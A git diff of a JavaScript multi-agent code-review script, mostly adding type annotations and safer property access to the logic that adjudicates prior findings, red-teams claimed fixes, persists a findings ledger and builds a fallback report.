+    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `- [${r.profile.id}] ${c}`)).join('\n')}`,
     carriedSection(),
     scopeSection(),
     ``,
@@ -5022,10 +5734,10 @@ if (gateFailed.length) {
   ].join('\n'))
 }
 
-let confirmed = results.flatMap(r => r.confirmed)
-let suspected = results.flatMap(r => r.suspected)
+let confirmed = results.flatMap(r => r['confirmed'])
+let suspected = results.flatMap(r => r['suspected'])
 // Low/Info nothing looked at. A third track, not a corner of Suspected — see verifyPool.
-let unverified = results.flatMap(r => r.unverified || [])
+let unverified = results.flatMap(r => r['unverified'] || [])
 
 // ---- Adjudicate track (re-review only) ----
 // For each prior-round finding, decide its fate this round. rejected/justified are carried (not
@@ -5035,13 +5747,15 @@ let unverified = results.flatMap(r => r.unverified || [])
 // around it unchanged has had its one confirmation and leaves the ledger. It still lives here for
 // the rest of THIS round — it suppresses a lens re-discovery (below) and renders in the report's
 // carried section — but it is not re-persisted, so it never costs another carry agent.
+/** @type {{ resolved: Finding[], stillOpen: Finding[], regressed: Finding[], carried: Finding[], retired: Finding[] }} */
 const adjudicated = { resolved: [], stillOpen: [], regressed: [], carried: [], retired: [] }
 // Tombstones: resolved/retired priors from EARLIER rounds, kept only as a recidivism check (a fresh
 // finding matching one is a regression, not a novelty). Filled on load below and read again at the
 // absorption pass — declared out here so both see it. It rides the persisted ledger like any row, so
 // a lost tombstone is caught by the same ledgerCount check every other row is.
+/** @type {LedgerAnswer[]} */
 const priorTombstones = []
-if (priorRound?.ledger?.length) {
+if (priorRound?.['ledger']?.length) {
   phase('Adjudicate')
   // Canonicalize prior severity ONCE, at the load boundary, BEFORE splitting/adjudicating/carrying:
   // LEDGER_ITEM.severity has no enum, so a drifted `critical`/`CRITICAL` prior would trip the
@@ -5050,14 +5764,14 @@ if (priorRound?.ledger?.length) {
   // still-broken Critical fix. Mapping through canonicalSeverity here means adjudicateOne's
   // `located = {...f}` and EVERY downstream verdict/count (countBySeverity, rereviewVerdict, the strict
   // escalation) and the re-persisted ledger all see canonical severity for priors.
-  const priorLedgerAll = priorRound.ledger.map(f => ({ ...f, severity: canonicalSeverity(f.severity) }))
+  const priorLedgerAll = priorRound['ledger'].map(f => ({ ...f, severity: canonicalSeverity(f['severity']) }))
   // TOMBSTONES ARE CARVED OUT BEFORE THE SPLIT. A `disposition:'closed'` row is a resolved/retired
   // prior kept only so a later round can recognise the defect's return — it is already answered.
   // Left in the pool it would fall into `toCheck` below and be sent to the adjudicator, spending an
   // agent to ask whether a closed defect is "still present" at a site where nothing remains to judge.
   // So it is pulled here and never enters the unverified/settled/toCheck partitions.
-  priorTombstones.push(...priorLedgerAll.filter(f => f.disposition === 'closed'))
-  const priorLive = priorLedgerAll.filter(f => f.disposition !== 'closed')
+  priorTombstones.push(...priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] === 'closed'))
+  const priorLive = priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] !== 'closed')
   // THE UNVERIFIED TIER SURVIVES THE ROUND BOUNDARY. A prior carrying `tier: 'unverified'` was never
   // checked against the code — so there is nothing to adjudicate: "is the defect still present?"
   // presumes someone established it was present. Adjudicating it anyway routed it into `stillOpen`,
@@ -5066,35 +5780,35 @@ if (priorRound?.ledger?.length) {
   // tier that exists to say "nothing checked this" lived only inside the round that minted it.
   // It re-enters THIS round's own unverified track instead: label kept, out of the verdict, out of
   // the refutation denominator, re-persisted as `unverified` for the next round.
-  const priorUnverified = priorLive.filter(f => String(f.tier || '') === 'unverified')
+  const priorUnverified = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') === 'unverified')
   if (priorUnverified.length) {
     log(`${priorUnverified.length} prior finding(s) carry the unverified tier — never checked against the code, so nothing to adjudicate: carried forward as unverified rather than promoted to still-open`)
-    unverified = unverified.concat(priorUnverified.map(f => ({
+    unverified = unverified.concat(priorUnverified.map((/** @type {Finding} */ f) => ({
       ...f,
-      fix: f.fix || 'verify it first — nothing has checked this claim against the code',
-      blastRadius: f.blastRadius || '',
+      fix: f['fix'] || 'verify it first — nothing has checked this claim against the code',
+      blastRadius: f['blastRadius'] || '',
       tier: 'unverified',
       // Flagged so the tracking pass below can use these as HOSTS. They are not in `livePriors` —
       // they were never adjudicated — so without the flag a fresh unverified re-discovery of the
       // same site is neither marked nor collapsed, and the site gains a ledger row every round.
       carriedUnverified: true,
-      why: `${baseWhy(f.why)} (STILL NOT VERIFIED: carried from round ${priorRound.round}, where no verifier judged it; nothing has checked it against the code since)`,
+      why: `${baseWhy(f['why'])} (STILL NOT VERIFIED: carried from round ${priorRound['round']}, where no verifier judged it; nothing has checked it against the code since)`,
     })))
   }
-  const priorLedger = priorLive.filter(f => String(f.tier || '') !== 'unverified')
-  const settled = priorLedger.filter(f => f.disposition === 'rejected' || f.disposition === 'justified')
-  const toCheck = priorLedger.filter(f => !(f.disposition === 'rejected' || f.disposition === 'justified'))
+  const priorLedger = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') !== 'unverified')
+  const settled = priorLedger.filter((/** @type {Finding} */ f) => f['disposition'] === 'rejected' || f['disposition'] === 'justified')
+  const toCheck = priorLedger.filter((/** @type {Finding} */ f) => !(f['disposition'] === 'rejected' || f['disposition'] === 'justified'))
 
   // Settled priors: carried unless the code around them changed since the prior round.
-  const carriedResults = (await parallel(settled.map(f => () => {
+  const carriedResults = (await parallel(settled.map((/** @type {Finding} */ f) => () => {
     const pf = promptFields(f)
     return ragent(
-      `A prior review finding was dismissed by the author (disposition: ${f.disposition}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound.head)}. Shell + read only.
-FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f.line} (symbol ${pf.symbol}), rule ${pf.ruleId}.
+      `A prior review finding was dismissed by the author (disposition: ${f['disposition']}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound['head'])}. Shell + read only.
+FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f['line']} (symbol ${pf.symbol}), rule ${pf.ruleId}.
 Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} -- ${shq(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
-      { label: `carry:${f.file}:${f.line}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
+      { label: `carry:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
     ).then(r => ({ f, changed: r == null ? null : !!r.changed }))
-  }))).filter(Boolean)
+  }))).filter(x => x != null)
   // A dead carry agent (changed == null) is indeterminate — keep the dismissed prior as carried (do
   // NOT reopen on an indeterminate carry), but count + ⚠️-log it like the other death paths so this
   // is no longer the one unaudited death path.
@@ -5133,41 +5847,41 @@ Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} --
   // The adjudicator must state the violated invariant and attack the fix — a fix that closes the
   // literal repro but not the class must not close. A "resolved" Critical/High is then re-attacked
   // by an independent red-team agent that never sees the adjudicator's verdict.
-  const adjudModel = results[0]?.plan?.lensModel || 'opus'
+  const adjudModel = results[0]?.['plan']?.lensModel || 'opus'
   let overturned = 0
   let redTeamDied = 0
   let invalidRedTeam = 0
   let adjudicatorDied = 0
   let cannotTellCount = 0
-  const redTeam = async (f, adj) => {
-    if (!isHighSeverity(f.severity)) return adj
+  const redTeam = async (/** @type {Finding} */ f, /** @type {AdjudicateAnswer} */ adj) => {
+    if (!isHighSeverity(f['severity'])) return adj
     const pf = promptFields(f)
     const rt = await ragent(
       `A code-review finding was raised on an earlier revision of this repo and the author has since pushed fix commits. Attack the fix. Shell + read only; do NOT hunt for unrelated bugs.
 FINDING: [${pf.severity}] ${pf.title}
-  originally at ${pf.file}:${f.line} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
+  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
   why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
 INVARIANT it violated: ${redTeamInvariant(adj, f)}
 METHOD: re-locate the symbol (grep it — the line has likely moved), read the current code, and try to CONSTRUCT a concrete input/state that violates the invariant even with the current code in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check every candidate against the actual code paths before claiming it works.
 Return {defeated, attack} — defeated=true ONLY with a concrete attack that survives your own check against the code.`,
-      { label: `redteam:${f.file}:${f.line}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
+      { label: `redteam:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
     )
     // A dead red-teamer keeps `resolved`: the adjudicator already ran its own attack pass, and a
     // transient agent death must not spuriously reopen findings. But the degradation must be
     // auditable — count it, log it, and annotate the note so "red-team passed" is distinguishable
     // from "red-team never ran" in the report and the run log.
     const { adj: out, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
-    if (died) { redTeamDied++; log(`⚠️ red-team for ${f.file}:${f.line} died — "resolved" stands on the adjudicator's own attack pass only`) }
-    if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f.file}:${f.line} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
+    if (died) { redTeamDied++; log(`⚠️ red-team for ${f['file']}:${f['line']} died — "resolved" stands on the adjudicator's own attack pass only`) }
+    if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f['file']}:${f['line']} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
     if (ov) overturned++
     return out
   }
-  const checkResults = (await parallel(toCheck.map(f => () => {
+  const checkResults = (await parallel(toCheck.map((/** @type {Finding} */ f) => () => {
     const pf = promptFields(f)
     return ragent(
-      `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${active[0].rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
+      `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${/** @type {Profile} */ (active[0]).rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
 FINDING: [${pf.severity}] ${pf.title}
-  originally at ${pf.file}:${f.line} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
+  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
   why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
 METHOD:
   1. State in ONE sentence the INVARIANT this finding violated — the property that must hold, not the literal repro (derive it from the why/title).
@@ -5179,9 +5893,9 @@ METHOD:
   - "cannot-tell": you could NOT determine the answer — the file is gone or renamed, the symbol no longer exists, or you could not read enough of the code to judge. Say why in \`note\`. Use this rather than "resolved" whenever you are guessing: "resolved" means you checked and every attack failed, never "I could not find it".
   - "regressed": the site was changed but now has a DIFFERENT defect of the same kind (cite it).
 Return {status, currentLine, note, invariant, attack}.`,
-      { label: `adjudicate:${f.file}:${f.line}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
-    ).then(async r => ({ f, r: shouldRedTeam(r) ? await redTeam(f, r) : r }))
-  }))).filter(Boolean)
+      { label: `adjudicate:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
+    ).then(async r => ({ f, r: r && shouldRedTeam(r) ? await redTeam(f, r) : r }))
+  }))).filter(x => x != null)
   for (const { f, r } of checkResults) {
     const { track, entry, demoted, cannotTell, adjudicatorDied: adjDied } = adjudicateOne(f, r)
     if (demoted) log(`⚠️ adjudicator for ${f.file}:${f.line} returned resolved WITH an attack — demoting to still-open`)
@@ -5232,8 +5946,9 @@ if (priorRound) {
     // (markTrackedUnverified), so it neither disappears into the prior nor gates anything.
     const { runs, updates, absorbed, keptAtRetired } = absorbAcross([confirmed, suspected], livePriors, retired, matchesPrior)
     for (const [host, why] of updates) host.why = why
-    confirmed = runs[0].kept
-    suspected = runs[1].kept
+    // Two lists in, two runs out — absorbAcross returns one run per list, in order.
+    confirmed = /** @type {(typeof runs)[number]} */ (runs[0]).kept
+    suspected = /** @type {(typeof runs)[number]} */ (runs[1]).kept
     if (absorbed) log(`Re-review: absorbed ${absorbed} new finding(s) into a still-live prior at the same file+rule — recorded on the prior's why (and delivered to next round's adjudicator as its own prompt lines) so they outlive it, not listed twice`)
     if (keptAtRetired) log(`Re-review: ${keptAtRetired} new finding(s) matched a prior that RETIRED this round — kept as findings rather than absorbed into a host that does not reach the next ledger`)
   }
@@ -5308,7 +6023,7 @@ if (priorRound) {
       // the relay dropped the field, or a logger older than it answered — so the cause named is that.
       const why = priorBasisMismatch
         ? 'the revisions the loader printed did not survive transport intact (the list no longer matches its own check string) — a transport or version-skew loss'
-        : (Array.isArray(priorRound?.priorFpRevisions) || typeof priorRound?.fpBasisKnown === 'boolean')
+        : (Array.isArray(priorRound?.['priorFpRevisions']) || typeof priorRound?.['fpBasisKnown'] === 'boolean')
         ? 'it was recovered from a stopped run whose checkpoints do not attest to one basis, its record could not be read, or it was written by an engine this one cannot place (no engine revision, or a newer one: a downgrade, or two installs sharing one store)'
         : 'the loader\'s answer did not say whether the basis was known (a relay that dropped the field, or a logger older than it) — a transport or version-skew loss'
       const note = `The fingerprint basis of the prior round could not be established — ${why} — so its ${priorTombstones.length} resolved/dismissed finding(s) were not compared against this round and are no longer remembered.`
@@ -5318,22 +6033,24 @@ if (priorRound) {
       log('Re-review: the prior round was fingerprinted under a different, known basis — so the recidivism check is skipped and its ' + priorTombstones.length + ' carried tombstone(s) are dropped; the memory rebuilds from this round on (expected once, right after an upgrade that changed the basis)')
     }
   } else if (priorTombstones.length) {
+    /** @type {Map<string, LedgerAnswer>} */
     const tombstoneByFp = new Map()
     for (const t of priorTombstones) if (t.ruleId) tombstoneByFp.set(t.fp || fingerprint(t), t)
     let regressions = 0
     let reraised = 0
-    const flagRegression = f => {
-      if (!f.ruleId) return
+    const flagRegression = (/** @type {Finding} */ f) => {
+      if (!f['ruleId']) return
       const hit = tombstoneByFp.get(fingerprint(f))
       if (!hit) return
       const why = String(hit.why || '')
       const m = /round (\d+)/.exec(why)
-      const r = m ? m[1] : (hit.round || '?')
+      // A LEDGER_ITEM carries no round, so this falls through to '?' unless a ledger extra supplies one.
+      const r = m ? m[1] : (/** @type {{ round?: unknown }} */ (hit).round || '?')
       if (/^dismissed /.test(why)) {
-        f.why = `${f.why} NOTE: a defect the author dismissed in round ${r} has been re-raised.`
+        f['why'] = `${f['why']} NOTE: a defect the author dismissed in round ${r} has been re-raised.`
         reraised++
       } else {
-        f.why = `${f.why} REGRESSION: this exact defect was resolved in round ${r} and has reappeared.`
+        f['why'] = `${f['why']} REGRESSION: this exact defect was resolved in round ${r} and has reappeared.`
         regressions++
       }
     }
@@ -5345,7 +6062,7 @@ if (priorRound) {
   }
 }
 
-const dropped = results.reduce((n, r) => n + r.dropped, 0)
+const dropped = results.reduce((n, r) => n + r['dropped'], 0)
 // Findings whose verdict was reached after at least one returned vote was DISCARDED as off-schema.
 // DERIVED from the flag tierFromVotes sets, not pushed from a branch — the same discipline `notRun`
 // is built with, and for the same reason. Read over `results` (what verification produced) rather
@@ -5359,11 +6076,11 @@ const dropped = results.reduce((n, r) => n + r.dropped, 0)
 // at all. The skipped Low/Info share that tier and carry no flag, so the filter excludes them by
 // construction.
 const thinned = results
-  .flatMap(r => [...r.confirmed, ...r.suspected, ...(r.refuted || []), ...(r.unverified || [])])
+  .flatMap(r => [...r['confirmed'], ...r['suspected'], ...(r['refuted'] || []), ...(r['unverified'] || [])])
   .filter(f => (f.votesDiscarded || 0) > 0).length
 // `scopeNotRun` leads: a scope the caller asked for and did not get is the first thing a reader of
 // the verdict needs, ahead of anything the run itself failed to finish.
-const notRun = [...scopeNotRun, ...results.flatMap(r => r.notRun)]
+const notRun = [...scopeNotRun, ...results.flatMap(r => r['notRun'])]
 // Files no profile covered are a coverage hole, not a footnote — but they are NOT a `notRun` entry.
 // `notRun` means "this ran badly; re-run it": every other entry is a failure a re-run can fix, and
 // lib/analyze-runs.mjs ranks the list by EXACT STRING to surface repeated fragility. A note
@@ -5374,10 +6091,10 @@ const notRun = [...scopeNotRun, ...results.flatMap(r => r.notRun)]
 // Same reasoning as `uncoveredFiles` directly above, from the other direction: a deliberate saving
 // is not a coverage hole either, so it joins neither `notRun` nor `coverageNotes` and never reaches
 // `incompleteNotes`. It is counted across runs by lib/analyze-runs.mjs, under its own heading.
-const savedByFloor = results.flatMap(r => r.savedByFloor || [])
+const savedByFloor = results.flatMap(r => r['savedByFloor'] || [])
 const coverageNotes = uncoveredGap.length ? [uncoveredNotRunNote(uncoveredGap)] : []
 const incompleteNotes = [...notRun, ...coverageNotes]
-const criticNotes = results.map(r => r.criticNotes).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')
+const criticNotes = results.map(r => r['criticNotes']).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')
 
 // A re-review with adjudicated content (still-open/regressed/resolved/carried priors) must fall
 // through to the full synthesis so the re-review report renders — a bare "Approve — no findings"
@@ -5404,7 +6121,7 @@ if (!confirmed.length && !suspected.length && !unverified.length && !hasAdjudica
   // path the caller asked for. The verdict line carries the CLASS (through `notRun`); only this
   // section carries the path, and a dropped scope matters most precisely when the answer is Approve.
   return out([`## Verdict`, verdictLine, ``, `## Gate`, mergedProvenance, carriedSection(),
-    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map(f => `- ${f}`)] : []),
+    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
   ].join('\n') + scopeSection())
 }
 
@@ -5435,6 +6152,8 @@ const rereviewData = isRereview ? {
 const incompleteClause = incompleteNotes.length
   ? ` Append " · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${incompleteNotes.join('; ')}; findings may be undercounted." to the verdict line.`
   : ''
+// Set when the synthesis agent answered but not with report text, so the fallback names the real cause.
+let synthesisUnusable = false
 const report = await ragent(
   `You are consolidating a code review (languages: ${active.map(p => p.id).join(', ')}) into ONE markdown report. Do NOT invent findings — only use what is given.
 
@@ -5474,7 +6193,18 @@ SUSPECTED (JSON): ${JSON.stringify(suspected, null, 2)}
 
 UNVERIFIED — NOT CHECKED (JSON): ${JSON.stringify(unverified, null, 2)}`,
   { label: 'synthesis', phase: 'Synthesize', effort: 'medium' },
-)
+// Without a schema the answer is the agent's final text; anything else is no report at all — but a
+// LIVE agent that answered with a non-string, or with blank text, did not die, and the fallback must
+// not say it did: every non-null answer that reaches the fallback is an unusable one.
+).then(text => {
+  if (typeof text === 'string' && text.trim()) return text
+  if (text != null) {
+    synthesisUnusable = true
+    const what = typeof text === 'string' ? 'blank text' : Array.isArray(text) ? 'an array' : `a value of type ${typeof text}`
+    log(`⚠️ synthesis agent answered with ${what}, not report text — discarded; using the mechanical fallback report`)
+  }
+  return null
+})
 
 // Optional: post Confirmed findings as inline PR comments (best-effort).
 // Best-effort means it must not FAIL the run; it does not mean it may be INVISIBLE. The caller asked
@@ -5546,17 +6276,18 @@ if (!floorPremiseHeld) {
 // nothing can keep it true. Re-evaluating it instead was rejected: the mark is recomputed from
 // scratch every round anyway (markTrackedUnverified), so a carried copy can only ever be a stale
 // duplicate of a fresh computation.
+/** @param {Finding} f @param {string | undefined} disposition @param {string} [tier] */
 const toLedgerEntry = (f, disposition, tier) => ({
-  fp: f.fp || fingerprint(f), file: f.file || '', line: f.line || 0, symbol: f.symbol || '',
-  severity: f.severity, tier: tier || f.tier || 'suspected', disposition: disposition || f.disposition || 'open',
-  source: f.source || '', ruleId: f.ruleId || '', title: f.title || '', why: String(f.why || '').split(TRACKED_MARK).join('').replace(THINNED_CLAUSE, ''),
-  ...(Array.isArray(f.sources) ? { sources: f.sources } : {}),
+  fp: f['fp'] || fingerprint(f), file: f['file'] || '', line: f['line'] || 0, symbol: f['symbol'] || '',
+  severity: f['severity'], tier: tier || f['tier'] || 'suspected', disposition: disposition || f['disposition'] || 'open',
+  source: f['source'] || '', ruleId: f['ruleId'] || '', title: f['title'] || '', why: String(f['why'] || '').split(TRACKED_MARK).join('').replace(THINNED_CLAUSE, ''),
+  ...(Array.isArray(f['sources']) ? { sources: f['sources'] } : {}),
   // A CARRIED finding arrived from the prior-round transport with a SHORTENED `why` and a `whyRef`
   // pointing at the record its FULL `why` lives in (its birth). Persist that pointer so the short-why/
   // full-by-reference chain survives into the next round. A FRESH finding (born this round, straight
   // from a lens) has no `whyRef`: its full `why` is persisted here verbatim and NO pointer is written.
-  ...(f.whyRef && typeof f.whyRef.record === 'string' && typeof f.whyRef.fp === 'string'
-    ? { whyRef: { record: f.whyRef.record, fp: f.whyRef.fp } } : {}),
+  ...(f['whyRef'] && typeof f['whyRef'].record === 'string' && typeof f['whyRef'].fp === 'string'
+    ? { whyRef: { record: f['whyRef'].record, fp: f['whyRef'].fp } } : {}),
 })
 // A tombstone for a resolved/retired prior: the same ledger shape, `disposition:'closed'`, but its
 // `why` is a fixed ORIGIN+round marker rather than the original rationale — a tombstone's only job is
@@ -5572,10 +6303,10 @@ const toLedgerEntry = (f, disposition, tier) => ({
 // the regression is missed in silence, the exact class the fingerprint-basis guard removes, only shifted a round
 // on. Minting every tombstone under the current basis closes it for BOTH paths (resolved and dismissed);
 // an incomparable CARRIED tombstone is dropped at assembly below, never re-minted here.
-const toTombstone = (f, origin = 'resolved') => {
+const toTombstone = (/** @type {Finding} */ f, origin = 'resolved') => {
   // A tombstone's `why` is a fixed ORIGIN+round marker, not a shortened rationale, so it owes no
   // `whyRef` back-pointer — drop the one a carried source finding may bring in, keeping the row bare.
-  const { whyRef: _whyRef, ...entry } = toLedgerEntry(f, 'closed', f.tier)
+  const { whyRef: _whyRef, ...entry } = toLedgerEntry(f, 'closed', f['tier'])
   return { ...entry, fp: fingerprint(f), why: `${origin} in round ${thisRound}` }
 }
 // The tombstone set is bounded against the border that actually governs the persisted
@@ -5615,7 +6346,7 @@ const reviewLedger = isRereview
     // the earlier ones carried forward) is deduped and capped above; each row keeps its own origin+
     // round marker, which is the round the REGRESSION / re-raised note reports.
     ...tombstones,
-    ...adjudicated.carried.map(f => toLedgerEntry(f, f.disposition)),
+    ...adjudicated.carried.map(f => toLedgerEntry(f, f['disposition'])),
   ]
   : allReviewFindings.map(f => toLedgerEntry(f, 'open', f.tier || 'suspected'))
 // THE LEDGER IS PERSISTED BEFORE THE RECORD IS ATTEMPTED, in bounded shards, one small checkpoint
@@ -5641,12 +6372,12 @@ await logRun(reviewRecord({
   round: thisRound,
   findings: summarizeFindings(allReviewFindings),
   ledger: reviewLedger,
-  dimensions: results.flatMap(r => r.plan.lenses.map(l => {
-    const s = summarizeFindings(r.confirmed.filter(f => (f.source || '') === l))
-    const confirmedCount = r.confirmed.filter(f => (f.source || '') === l).length
-    const suspectedCount = r.suspected.filter(f => (f.source || '') === l).length
-    const unverifiedCount = (r.unverified || []).filter(f => (f.source || '') === l).length
-    const refutedCount = (r.refuted || []).filter(f => (f.source || '') === l).length
+  dimensions: results.flatMap(r => r['plan'].lenses.map((/** @type {string} */ l) => {
+    const s = summarizeFindings(r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l))
+    const confirmedCount = r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
+    const suspectedCount = r['suspected'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
+    const unverifiedCount = (r['unverified'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
+    const refutedCount = (r['refuted'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
     // `ran` distinguishes "executed and found nothing" from "never returned". Both otherwise render
     // as a 0-finding row, and the yield analysis would read a broken lens as a redundant one.
     // Absent `ranLenses` (a record written before this landed) → assume it ran, the old behaviour.
@@ -5660,25 +6391,27 @@ await logRun(reviewRecord({
 // If the synthesis agent died even after the retry, don't lose the whole run — assemble a
 // mechanical report from the verified findings (unmerged, but complete).
 function fallbackReport() {
+  // Why there is no synthesized report: a death and a live answer that was not report text read differently.
+  const cause = synthesisUnusable ? 'synthesis agent returned no usable report' : 'synthesis agent died twice'
   // On a re-review the verdict must come from recordVerdict (still-open+regressed+new), NOT
   // finalVerdict(confirmed) — confirmed holds only the delta, so finalVerdict would print a false
   // Approve and hide live still-open/regressed priors. Render those tracks too.
   const emoji = { Block: '⛔ Block', Warning: '⚠️ Warning', Approve: '✅ Approve' }[isRereview ? recordVerdict : finalVerdict(confirmed)]
-  const fmt = f => `- ${f.severity} · \`${f.file || '?'}:${f.line || 0}\`${f.ruleId ? ` · [${f.ruleId}]` : ''} · ${f.title} · ${f.why} · Fix: ${f.fix}${f.whereChecked ? ` · Premise checked at: ${f.whereChecked}` : ''}`
-  const bySev = a => a.slice().sort((x, y) => (SEV_RANK[x.severity] ?? 9) - (SEV_RANK[y.severity] ?? 9))
+  const fmt = (/** @type {Finding} */ f) => `- ${f['severity']} · \`${f['file'] || '?'}:${f['line'] || 0}\`${f['ruleId'] ? ` · [${f['ruleId']}]` : ''} · ${f['title']} · ${f['why']} · Fix: ${f['fix']}${f['whereChecked'] ? ` · Premise checked at: ${f['whereChecked']}` : ''}`
+  const bySev = (/** @type {Finding[]} */ a) => a.slice().sort((/** @type {Finding} */ x, /** @type {Finding} */ y) => (SEV_RANK[x['severity'] ?? ''] ?? 9) - (SEV_RANK[y['severity'] ?? ''] ?? 9))
   return [
     `## Verdict`,
     // `notRun` LIVE, not the `incompleteNotes` snapshot taken before the verdict existed: the
     // revoked-premise path pushes into `notRun` afterwards, and a fallback rendered from the stale
     // snapshot would print a clean verdict over findings the same run has just declared unchecked.
-    `${emoji} — synthesis agent died twice; mechanical fallback report (findings listed unmerged).${[...notRun, ...coverageNotes].length ? ` · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${[...notRun, ...coverageNotes].join('; ')}.` : ''}`,
+    `${emoji} — ${cause}; mechanical fallback report (findings listed unmerged).${[...notRun, ...coverageNotes].length ? ` · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${[...notRun, ...coverageNotes].join('; ')}.` : ''}`,
     ``, `## Gate`, mergedProvenance, carriedSection(),
     ...(isRereview && adjudicated.stillOpen.length ? [``, `## 🔴 Still open`, ...bySev(adjudicated.stillOpen).map(fmt)] : []),
     ...(isRereview && adjudicated.regressed.length ? [``, `## ⚠️ Regressed`, ...bySev(adjudicated.regressed).map(fmt)] : []),
     ``, `## ${isRereview ? '🆕 New' : 'Confirmed'}`, ...(confirmed.length ? bySev(confirmed).map(fmt) : ['- none']),
     ...(suspected.length ? [``, `## Suspected (needs confirmation)`, ...bySev(suspected).map(fmt)] : []),
     ...(unverified.length ? [``, `## Unverified (not checked)`, UNVERIFIED_PREAMBLE, ...bySev(unverified).map(fmt)] : []),
-    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map(f => `- ${f}`)] : []),
+    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
   ].join('\n')
 }
 
@@ -5692,13 +6425,14 @@ function fallbackReport() {
 // record and the report disagree, and rust-audit's dimension roll-up reads the verdict STRING: a
 // clean line there carries the wrong-green up into the audit.
 // Amends the first non-empty line under `## Verdict`, and only if it does not already say so.
+/** @param {string} text */
 function markVerdictIncomplete(text) {
   if (floorPremiseHeld) return text
   const lines = String(text).split('\n')
   const head = lines.findIndex(l => /^#+\s*Verdict\b/i.test(l.trim()))
   if (head < 0) return text
   const at = lines.findIndex((l, i) => i > head && l.trim())
-  if (at < 0 || /INCOMPLETE/.test(lines[at])) return text
+  if (at < 0 || /INCOMPLETE/.test(/** @type {string} */ (lines[at]))) return text
   lines[at] = `${lines[at]} · ⚠️ INCOMPLETE — ${savedByFloor.length} verification(s) were skipped because the verdict stood at Block, and the run did not end at Block; those findings are unverified for a reason that did not apply.`
   return lines.join('\n')
 }
